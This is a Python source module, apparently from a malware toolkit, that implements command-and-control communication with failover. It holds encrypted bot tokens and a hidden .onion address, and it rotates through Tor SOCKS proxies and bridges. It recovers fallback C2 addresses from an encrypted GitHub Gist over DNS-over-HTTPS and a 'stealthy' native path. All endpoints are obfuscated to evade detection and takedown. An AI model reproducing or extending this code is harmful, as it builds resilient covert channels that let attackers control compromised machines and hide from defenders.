"""
core/c2.py - Multi-token C2 with failover
"""

import time
import random
import threading
from core.obfuscation import decrypt_string

import requests
import json
from typing import Optional
from core.obfuscation import decrypt_string, encrypt_string

class GistResolver:
    """
    H-11b: C2 discovery via GitHub Gist.
    
    Provides a resilient fallback mechanism for C2 address discovery. 
    It fetches an encrypted payload from a raw GitHub Gist URL, 
    decrypts it locally, and provides the current active C2 address.
    """
    def __init__(self, gist_url_enc: str):
        self.gist_url = decrypt_string(gist_url_enc)

    def resolve(self) -> Optional[str]:
        """Fetch and decrypt C2 address from Gist (C# optimized)"""
        try:
            # 1. Try C# Native Networking (Stealthy + DoH)
            try:
                import clr
                from VanguardCore import NetworkingManager
                # Gist ID is the last part of the URL or we extract it
                gist_id = self.gist_url.split('/')[-1]
                data = NetworkingManager.GetGistData(gist_id, None)
                if data:
                    return data
            except:
                pass

            # 2. Fallback to Python DoH
            from core.dns_resolver import secure_resolver
            url = secure_resolver.get_url_with_ip(self.gist_url)
            host = self.gist_url.split('/')[2]
            
            response = requests.get(url, headers={"Host": host}, timeout=10)
            if response.status_code == 200:
                return decrypt_string(response.text.strip())
        except Exception as e:
            from core.error_logger import log_error
            log_error(f"GistResolver: Failed to resolve C2: {e}")
        return None

class C2Manager:
    """Manages multiple C2 tokens with automatic failover"""

    def __init__(self):
        from core.config import ConfigManager
        
        # H-06: Tokens and infrastructure are now loaded from ConfigManager
        self.tokens = ConfigManager.get("tokens", [
            decrypt_string("VgZBXH9pYVJuRVB5M38tOxcCMSEFYhJUNTEJdh1rUjkgfU0NFwEhEzVAPFsAaA=="),
            decrypt_string("VgdKW39paFVjQFB5M38+MRcEFw87P2oAICEGczQLAEoDAS0CNzI1V3cQJQgKVg=="),
            decrypt_string("VgVPWn9lblNrTlB5M38SVycDHF56Z2AMEi0jS0AAJA0Fdh4BGhY8N2otHnQYDQ=="),
        ])

        self.bridges = ConfigManager.get("bridges", [])

        self.onion_urls = ConfigManager.get("onion_urls", [
            decrypt_string("BkYMGz1rdk0hBA9KB09dBwdfHU8/Kjw7FzsYCFxdSxMU"), # Example .onion
        ])

        self.proxies = ConfigManager.get("proxies", [
            "socks5h://127.0.0.1:9050", # Standard TOR
            "socks5h://127.0.0.1:9150", # TOR Browser
        ])

        self.failover_chain = ConfigManager.get("failover_chain", [
            ('direct', None),
            ('socks5', '127.0.0.1:9050'),
            ('http', 'proxy.failover.com:8080')
        ])

        gist_url_enc = ConfigManager.get("GIST_RESOLVER_URL", "BkYMG3R+dgYmFBIdHhcIUhZWAwwmMTlCHwUYVwhL")
        self.gist_resolver = GistResolver(gist_url_enc)
        
        self.current_token_index = 0
        self.current_bridge_index = 0
        self.current_proxy_index = -1 # -1 means no proxy
        self.failed_attempts = 0
        self.max_failures = 3
        self.lock = threading.Lock()

    def get_gist_c2(self) -> Optional[str]:
        """Fetch C2 from Gist as last resort"""
        return self.gist_resolver.resolve()

    def get_current_token(self):
        """Get current active token and apply Gist proxy if blocked"""
        from core.geo_fence import GeoFence
        from core.bridge_manager import bridge_manager
        
        if GeoFence.is_tg_blocked():
            proxy = bridge_manager.get_gist_proxy()
            if proxy:
                log_info(f"C2: Applying P2P Bridge Proxy: {proxy}")
                # Apply globally to requests
                import requests
                proxies = {
                    "http": f"socks5h://{proxy}",
                    "https": f"socks5h://{proxy}"
                }
                # Note: This is simplified. In a full implementation, 
                # we would use a session or hook into requests.
                self.proxies = [f"socks5h://{proxy}"]
                self.current_proxy_index = 0

        with self.lock:
            tok = self.tokens[self.current_token_index]
            return tok.strip() if isinstance(tok, str) else ""

    def get_proxy(self):
        """Get current proxy if failover is active"""
        with self.lock:
            if self.current_proxy_index == -1: return None
            return self.proxies[self.current_proxy_index % len(self.proxies)]

    def report_failure(self):
        """Report a failure and potentially switch tokens/proxies"""
        with self.lock:
            self.failed_attempts += 1
            if self.failed_attempts >= self.max_failures:
                # If we've failed enough, try enabling proxy
                if self.current_proxy_index == -1:
                    self.current_proxy_index = 0
                    log_info("Enabling SOCKS5 proxy failover", "C2")
                else:
                    self.current_proxy_index += 1
                    self._switch_to_next()
                return True
        return False

    def report_success(self):
        """Reset failure counter and potentially disable proxy"""
        with self.lock:
            self.failed_attempts = 0
            # If we succeed with proxy, we keep it for now. 
            # If we succeed without it, definitely keep it off.

    def _switch_to_next(self):
        """Switch to next available token"""
        self.current_token_index = (self.current_token_index + 1) % len(self.tokens)
        log_info(f"Switched to token index {self.current_token_index}", "C2")
        self.failed_attempts = 0

    def get_api_url(self):
        """Get full API URL with current bridge or onion fallback"""
        with self.lock:
            if self.current_proxy_index != -1 and self.onion_urls:
                return self.onion_urls[0] + decrypt_string("QVAXHzVhJE0hRhc=")

        try:
            from core.bridge_manager import bridge_manager
            route = bridge_manager.get_best_route()
            if route and route.get('api_url'):
                return route['api_url']
        except:
            pass

        bridge = self.get_current_bridge()
        if bridge:
            return bridge + decrypt_string("QVAXHzVhJE0hRhc=")
        return decrypt_string("BkYMGz1rdk07BwMWBlwKHwlAGQZgPisFdRUFTAkJG1UVAwU=")

    def get_file_url(self):
        """Get file URL with current bridge or onion fallback"""
        with self.lock:
            if self.current_proxy_index != -1 and self.onion_urls:
                return self.onion_urls[0] + decrypt_string("QVQRByt+Ow0uDFpFXUJXBw==")

        try:
            from core.bridge_manager import bridge_manager
            route = bridge_manager.get_best_route()
            if route and route.get('file_url'):
                return route['file_url']
        except:
            pass

        bridge = self.get_current_bridge()
        if bridge:
            return bridge + decrypt_string("QVQRByt+Ow0uDFpFXUJXBw==")
        return decrypt_string("BkYMGz1rdk07BwMWBlwKHwlAGQZgPisFdREDVBcWBBUaSUgWYSpoHw==")

from core.error_logger import log_info, log_error
c2_manager = C2Manager()
